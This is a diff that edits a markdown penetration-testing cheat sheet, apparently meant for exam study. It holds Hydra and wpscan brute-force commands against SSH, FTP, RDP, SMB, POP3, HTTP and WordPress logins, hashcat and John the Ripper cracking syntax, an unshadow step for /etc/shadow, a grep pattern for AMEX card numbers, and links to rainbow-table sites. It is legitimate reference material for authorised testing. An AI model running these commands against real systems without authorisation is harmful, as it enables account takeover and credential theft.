@@ -165,7 +165,7 @@ AMEX `# grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt`
 
 > **Note:** if you want to isolate all columns after column 3 use `# cut -d "," -f 3- infile.csv > outfile.csv`
 
-### Generate Random Passwords with urandom
+### Generate Random Passwords with /dev/urandom
 
 ```text
 # tr -dc 'a-zA-Z0-9._!@#$%^&*()' < /dev/urandom | fold -w 8 | head -n 500000 > wordlist.txt
@@ -181,7 +181,7 @@ AMEX `# grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt`
 
 `# tr -d '()' < in_file > out_file`
 
-### Generate wordlists from your file-names
+### Generate wordlists from your file names
 
 `# ls -A | sed 's/regexp/& /g'`
 
@@ -241,67 +241,65 @@ https://book.hacktricks.xyz/brute-force
 
 ## Hydra <a id="hydra"></a>
 
+Below are a few scriptable examples of common protocols to brute force logins.
+
 | Command | Description |
 | :--- | :--- |
-| hydra -P password-file.txt -v $ip snmp | Hydra brute force against SNMP |
-| hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp | Hydra FTP known user and rockyou password list |
-| hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh | Hydra SSH using list of users and passwords |
-| hydra -v -V -u -L users.txt -p "" -t 1 -u $ip ssh | Hydra SSH using a known password and a username list |
-| hydra $ip -s 22 ssh -l -P big\_wordlist.txt | Hydra SSH Against Known username on port 22 |
-| hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V | Hydra POP3 Brute Force |
-| hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V | Hydra SMTP Brute Force |
-| hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin | Hydra attack http get 401 login with a dictionary |
-| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip | Hydra attack Windows Remote Desktop with rockyou |
-| hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb | Hydra brute force SMB user with rockyou: |
-| hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | Hydra brute force a Wordpress admin login |
-| hydra -vV -L unique -p wedontcare $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' | Hydra brute force a username |
-| wpscan --url [http://192.168.1.122](http://192.168.1.122/) -U Elliot -P fsociety.dic.unique | Use wpscan to bruteforce password |
+| hydra -P $pass\_list -v $ip snmp -v | Brute force against SNMP |
+| hydra -t 1 -l $user -P $pass\_list -v $ip ftp | FTP with  known user using password list |
+| hydra -v -V -u -L $users\_list -P $pass\_list -t 1 -u $ip ssh | SSH using list of users and passwords |
+| hydra -v -V -u -L $users\_list -p $pass -t 1 -u $ip ssh | SSH with a known password and a username list |
+| hydra $ip -s $port ssh -l $user -P $pass\_list | SSH with known username on non-standard port |
+| hydra -l $user -P $pass\_list -f $ip pop3 -v | POP3 Brute Force |
+| hydra -L $users\_list -P $pass\_list $ip http-get $login\_page | HTTP GET with user and pass list |
+| hydra -t 1 -v -f -l $user -P $pass\_list rdp://$ip | Windows Remote Desktop with pass list |
+| hydra -t 1 -V -f -l $user -P $pass\_list $ip smb | SMB brute force with known user and pass list |
+| hydra -l $user -P $pass\_list $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location' | WordPress brute force an admin login |
+| hydra -v -L $users\_list -p $pass $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' | WordPress enumerate users |
+| wpscan --url $url -U $user -P $pass\_list | Use wpscan to brute force password with known user |
 
-* MD5 32 hex characters.
-* SHA-1 40 hex characters.
-* SHA-256 64 hex characters.
-* SHA-512 128 hex characters.
+## Password Hashes
+
+### Identifying Hashes
+
+* MD5 = 32 hex characters.
+* SHA-1 = 40 hex characters.
+* SHA-256 = 64 hex characters.
+* SHA-512 = 128 hex characters.
+
+
+
 * Find the type of hash:
 
   ```text
   hash-identifier
   ```
 
-* Find hash type at https://hashkiller.co.uk
-* Running john will tell you the hash type even if you don't want to crack it:
+* Find hash type at [https://hashkiller.co.uk](https://hashkiller.co.uk)
+* Running `john` with no parameters will attempt to tell you the hash type:
 
   ```text
-  john hashes.txt
+  john $hash_list
   ```
 
-* Paste the entire /etc/shadow in file and run
+### Hash Cracking
+
+* Hashcat basic syntax:
 
   ```text
-  john hashes.txt
+  hashcat -m $hash_type -a $mode -o $out_file $hash_file $pass_list
   ```
 
-* Paste the entire /etc/shadow in file and run
+* John the Ripper basic syntax:
 
   ```text
-  john hashes.txt
+  john --wordlist=$pass_list --format $hash_format $hash_list
   ```
 
-* GPU cracking:
+* Convert hashes from `/etc/shadow`to a crackable format \(then use john to crack\):
 
   ```text
-  hashcat -m 500 -a 0 -o output.txt -remove hashes.txt /usr/share/wordlists/rockyou.txt
-  ```
-
-* CPU cracking:
-
-  ```text
-  john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump
-  ```
-
-* Cracking **/etc/shadow**:
-
-  ```text
-  unshadow password.txt shadow.txt > unshadowed.txt; john --wordlist=<any word list> unshadowed.txt
+  unshadow $etc_password $etc_shadow > $unshadowed_outfile
   ```
 
 * Generating wordlists
@@ -310,13 +308,20 @@ https://book.hacktricks.xyz/brute-force
   crunch 6 6 0123456789ABCDEF 5o crunch1.txt
   ```
 
-* Online rainbow tables:
+Online rainbow tables:
+
+* https://crackstation.net/
+* http://www.cmd5.org/
+* https://hashkiller.co.uk/md5-decrypter.aspx
+* https://www.onlinehashcrack.com/
+* http://rainbowtables.it64.com/
+* http://www.md5online.org
 
   ```text
   https://crackstation.net/http://www.cmd5.org/https://hashkiller.co.uk/md5-decrypter.aspxhttps://www.onlinehashcrack.com/http://rainbowtables.it64.com/http://www.md5online.org/
   ```
 
-## Hashcat-Cheatsheet <a id="hashcat-cheatsheet"></a>
+## Hashcat Cheatsheet <a id="hashcat-cheatsheet"></a>
 
 Hashcat Cheatsheet for OSCP [https://hashcat.net/wiki/doku.php?id=hashcat](https://hashcat.net/wiki/doku.php?id=hashcat)​
 
